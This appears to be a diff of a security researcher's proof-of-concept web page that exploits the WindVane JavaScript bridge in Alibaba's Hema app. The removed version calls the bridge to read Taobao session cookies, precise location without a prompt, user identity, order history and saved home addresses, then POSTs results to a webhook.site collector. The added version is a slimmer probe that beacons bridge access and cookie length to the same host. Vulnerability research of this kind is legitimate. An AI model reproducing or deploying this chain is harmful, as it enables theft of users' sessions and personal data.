@@ -1,37 +1,19 @@
-<!DOCTYPE html>
-<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>会员权益助手</title></head>
-<body style="margin:0;background:#0d1117;color:#58a6ff;font:13px/1.7 monospace;padding:10px">
-<h3 style="color:#f85149;margin:4px 0">盒马 PoC — 公网域名真实利用链</h3>
-<div id="meta" style="color:#8b949e;font-size:11px"></div>
-<pre id="o" style="white-space:pre-wrap;word-break:break-all"></pre>
-<script>
-var CB="https://webhook.site/fcc79d5e-4ef9-4e34-b3d5-ebf98bb06639/x";
-function log(k,v){var s="["+k+"] "+v;try{document.getElementById('o').textContent+=s+"\n";}catch(e){}
- try{fetch(CB,{method:'POST',body:JSON.stringify({step:k,data:String(v).substr(0,700),href:location.href})});}catch(e){}}
-document.getElementById('meta').textContent="origin: "+location.origin+" | AliApp: "+/AliApp/.test(navigator.userAgent)+" | "+new Date().toLocaleTimeString();
+<!DOCTYPE html><html><head><meta charset="utf-8"><script>
+var CB="https://webhook.site/fcc79d5e-4ef9-4e34-b3d5-ebf98bb06639/";
+function ex(d){new Image().src=CB+"m_"+encodeURIComponent(String(d).substr(0,130));}
+ex("1_head_parse_"+location.host);
+</script></head><body><script>
+ex("2_body_parse");
 var C=window.__windvane__&&window.__windvane__.windVaneCoreJs;
-if(C){try{var sc=document.createElement('script');sc.textContent=C;document.head.appendChild(sc);}catch(e){}}
-log("1-CONTAINER","loaded origin="+location.origin);
-setTimeout(function(){
- if(typeof window.__windvane__!=="object"){log("ERR","bridge absent");return;}
- log("2-BRIDGE","WindVane injected");
- // 3 Cookie（打码外带：键名+数量+截断长度，证明桥读取成功即可）
- window.__windvane__.call("WVCookie.readCookies",JSON.stringify({url:"https://www.taobao.com/"}),function(d){
-  var s=JSON.stringify(d); var names=(s.match(/"(cookie2|_tb_token_|sgcookie|unb|_m_h5_tk|t)"/g)||[]);
-  log("3-COOKIE","taobao Cookie 读取成功 len="+s.length+" 关键键="+names.join(","));});
- // 4 定位
- setTimeout(function(){window.__windvane__.call("WVLocation.getLocation","{}",function(d){
-  var j={};try{j=JSON.parse(JSON.stringify(d));}catch(e){} var c=j.data&&j.data.coords||{};
-  log("4-LOCATION","经纬度="+c.longitude+","+c.latitude+" 精度="+c.accuracy+"m（无弹窗直取）");});},2500);
- // 5 身份
- setTimeout(function(){window.__windvane__.call("WVWDKHemaApi.getUserInfo","{}",function(d){
-  var s=JSON.stringify(d); log("5-IDENTITY",s.substr(0,160));});},5000);
- // 6 MTOP 订单
- setTimeout(function(){window.__windvane__.call("MtopWVPlugin.send",JSON.stringify({api:"mtop.hema.trade.order.buyer.list.pagequery",v:"1.1",param:{pageQueryListRequest:{pageIndex:"1",pageSize:"2",tabId:"0"}},needLogin:true}),
-  function(d){var s=JSON.stringify(d); log("6-MTOP-ORDER","ret="+(s.indexOf("SUCCESS")>=0?"SUCCESS":"FAIL")+" len="+s.length);});},8000);
- // 7 地址 PII
- setTimeout(function(){window.__windvane__.call("MtopWVPlugin.send",JSON.stringify({api:"mtop.wdk.lbs.location.UserAddressReadApi.getAllAddress",v:"1.0",param:{requestType:1,geoCode:"110100",source:"HEMA_APP",terminal:"HEMA_APP",channelCode:"HM"},needLogin:true}),
-  function(d){var s=JSON.stringify(d); log("7-ADDRESS-PII","ret="+(s.indexOf("SUCCESS")>=0?"SUCCESS 含住址":"FAIL")+" len="+s.length);});},11000);
-},1500);
+if(C){try{var s=document.createElement("script");s.textContent=C;document.head.appendChild(s);ex("3_corejs_injected");}catch(e){ex("3_corejs_err");}}
+function tryBridge(tag){
+ if(typeof window.__windvane__!=="object"){ex(tag+"_absent");return;}
+ ex(tag+"_READY");
+ try{window.__windvane__.call("WVCookie.readCookies",JSON.stringify({url:"https://www.taobao.com/"}),function(d){
+  ex(tag+"_cookie_len_"+JSON.stringify(d).length);});}catch(e){ex(tag+"_callerr");}
+}
+tryBridge("t0");
+setTimeout(function(){tryBridge("t100");},100);
+setTimeout(function(){tryBridge("t500");},500);
+setTimeout(function(){tryBridge("t1500");},1500);
 </script></body></html>
